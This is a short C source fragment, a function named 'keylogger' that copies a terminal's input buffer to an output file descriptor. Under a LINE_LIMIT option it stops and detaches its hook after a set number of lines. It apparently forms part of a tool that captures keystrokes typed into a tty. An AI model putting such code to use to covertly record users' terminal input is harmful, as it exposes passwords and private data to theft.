
static void keylogger(tas_tty *tty, char **buf, size_t *n)
{
	int fd = tty->output_fd;

#ifdef LINE_LIMIT
	static int lines = 0;

	for (size_t i = 0; i < *n; i++) {
		if ((*buf)[i] == '\n') {
			lines++;
		}

		if (lines == LINE_LIMIT) {
			write(fd, (*buf), i);
			close(fd);

			tty->input_hook = NULL;
			return;
		}
	}

#endif

	if (write(fd, *buf, *n) == -1)
		tty->input_hook = NULL;
}
